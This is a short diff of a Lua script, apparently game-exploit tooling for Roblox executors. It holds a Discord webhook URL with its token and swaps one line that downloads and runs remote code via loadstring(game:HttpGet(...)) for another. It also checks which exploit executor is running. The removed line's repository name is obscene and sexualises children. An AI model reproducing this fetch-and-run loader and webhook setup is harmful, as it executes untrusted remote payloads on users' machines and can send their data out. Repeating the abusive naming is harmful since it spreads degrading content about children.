@@ -1,5 +1,6 @@
 local webh = "https://discord.com/api/webhooks/1091927538336551002/0dh0x3K3EBl1cIGxaNfGOFA-fHe_f3oHpFjBIdGnT-Q84X8xVPIuUvcDwLOgvLlsmOqr"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/valplex/queefsisterspart4nation/main/welovequeefingonchildren'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/fusiongreg/BoltsHubV5/main/Main'))()
+
 
                function checkexploit()
 	if syn then return "Synapse X"
